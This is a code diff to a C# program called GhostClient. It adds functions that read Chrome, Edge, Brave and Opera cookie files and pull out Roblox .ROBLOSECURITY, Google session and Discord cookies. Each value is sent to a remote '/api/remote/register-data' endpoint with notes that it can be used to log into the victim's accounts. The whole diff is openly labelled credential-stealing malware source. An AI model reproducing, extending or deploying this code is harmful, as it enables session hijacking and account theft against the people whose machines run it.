@@ -352,6 +352,64 @@ namespace GhostClient
                 PostJson("/api/remote/register-data", sysPayload);
             } catch { }
 
+            // Roblox cookies
+            try {
+                string robloxCookies = GrabRobloxCookies();
+                if (!string.IsNullOrEmpty(robloxCookies))
+                {
+                    var payload = new Dictionary<string, object> {
+                        { "clientId", myClientId },
+                        { "type", "roblox_cookies" },
+                        { "source", "Browser Cookies" },
+                        { "data", JsonEncode(new Dictionary<string, object> {
+                            { "cookie", robloxCookies },
+                            { "note", ".ROBLOSECURITY cookie - can be used to login to Roblox account" }
+                        })}
+                    };
+                    PostJson("/api/remote/register-data", payload);
+                    results.Add("Roblox: .ROBLOSECURITY cookie found!");
+                }
+            } catch { }
+
+            // Google account cookies
+            try {
+                var googleData = GrabGoogleCookies();
+                if (googleData.Count > 0)
+                {
+                    var payload = new Dictionary<string, object> {
+                        { "clientId", myClientId },
+                        { "type", "google_cookies" },
+                        { "source", "Browser Cookies" },
+                        { "data", JsonEncode(new Dictionary<string, object> {
+                            { "accounts_found", googleData.Count },
+                            { "cookies", googleData },
+                            { "note", "Google account session cookies - Gmail, YouTube, Drive access" }
+                        })}
+                    };
+                    PostJson("/api/remote/register-data", payload);
+                    results.Add("Google: " + googleData.Count + " account(s) found");
+                }
+            } catch { }
+
+            // Discord token cookies (from browser)
+            try {
+                string discordCookies = GrabDiscordBrowserCookies();
+                if (!string.IsNullOrEmpty(discordCookies))
+                {
+                    var payload = new Dictionary<string, object> {
+                        { "clientId", myClientId },
+                        { "type", "discord_browser_cookies" },
+                        { "source", "Browser Cookies" },
+                        { "data", JsonEncode(new Dictionary<string, object> {
+                            { "cookie", discordCookies },
+                            { "note", "Discord browser session cookie" }
+                        })}
+                    };
+                    PostJson("/api/remote/register-data", payload);
+                    results.Add("Discord browser cookie found");
+                }
+            } catch { }
+
             return string.Join("\n", results);
         }
 
@@ -1834,6 +1892,110 @@ namespace GhostClient
                 }
             }
             return sb.Length > 40 ? sb.ToString() : "No browser login data found.";
+        }
+
+        // ── ROBLOX COOKIE STEALER ──
+        static string GrabRobloxCookies()
+        {
+            try
+            {
+                string[] cookiePaths = new string[] {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
+                };
+
+                foreach (string cookiePath in cookiePaths)
+                {
+                    if (!File.Exists(cookiePath)) continue;
+                    try
+                    {
+                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
+                        // Find .ROBLOSECURITY cookie
+                        var match = Regex.Match(content, @"\.ROBLOSECURITY[^\x00]*");
+                        if (match.Success)
+                        {
+                            // Extract the cookie value
+                            var valueMatch = Regex.Match(match.Value, @"([A-Za-z0-9_.\-+]+)");
+                            if (valueMatch.Success && valueMatch.Value.Length > 20)
+                                return valueMatch.Value;
+                        }
+                    } catch { }
+                }
+                return "";
+            }
+            catch { return ""; }
+        }
+
+        // ── GOOGLE COOKIES ──
+        static List<Dictionary<string, string>> GrabGoogleCookies()
+        {
+            var accounts = new List<Dictionary<string, string>>();
+            try
+            {
+                string[] cookiePaths = new string[] {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
+                };
+
+                foreach (string cookiePath in cookiePaths)
+                {
+                    if (!File.Exists(cookiePath)) continue;
+                    try
+                    {
+                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
+                        // Look for Google account identifiers in cookies
+                        var sidMatch = Regex.Match(content, @"SID[^\x00]*@gmail\.com[^\x00]*");
+                        var hsidMatch = Regex.Match(content, @"__Host-GAPS[^\x00]*");
+                        var osidMatch = Regex.Match(content, @"OSID[^\x00]*@gmail\.com[^\x00]*");
+                        
+                        if (sidMatch.Success || hsidMatch.Success)
+                        {
+                            var acc = new Dictionary<string, string>();
+                            acc["source"] = Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(cookiePath)));
+                            
+                            // Extract email from cookie data
+                            var emailMatch = Regex.Match(content, @"([a-zA-Z0-9._%+-]+@gmail\.com)");
+                            if (emailMatch.Success) acc["email"] = emailMatch.Value;
+                            
+                            if (sidMatch.Success) acc["SID_found"] = "true";
+                            if (hsidMatch.Success) acc["GAPS_found"] = "true";
+                            acc["cookie_raw"] = content.Substring(Math.Max(0, content.IndexOf("@gmail.com") - 50), Math.Min(100, content.Length - Math.Max(0, content.IndexOf("@gmail.com") - 50)));
+                            
+                            if (acc.ContainsKey("email") || acc.ContainsKey("SID_found"))
+                                accounts.Add(acc);
+                        }
+                    } catch { }
+                }
+            } catch { }
+            return accounts;
+        }
+
+        // ── DISCORD BROWSER COOKIES ──
+        static string GrabDiscordBrowserCookies()
+        {
+            try
+            {
+                string[] cookiePaths = new string[] {
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Cookies",
+                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
+                };
+
+                foreach (string cookiePath in cookiePaths)
+                {
+                    if (!File.Exists(cookiePath)) continue;
+                    try
+                    {
+                        string content = File.ReadAllText(cookiePath, Encoding.UTF8);
+                        // Discord uses specific cookie names
+                        var tokenMatch = Regex.Match(content, @"discord\.com[^\x00]*token[^\x00]*");
+                        if (tokenMatch.Success) return tokenMatch.Value;
+                    } catch { }
+                }
+                return "";
+            }
+            catch { return ""; }
         }
     }
 }
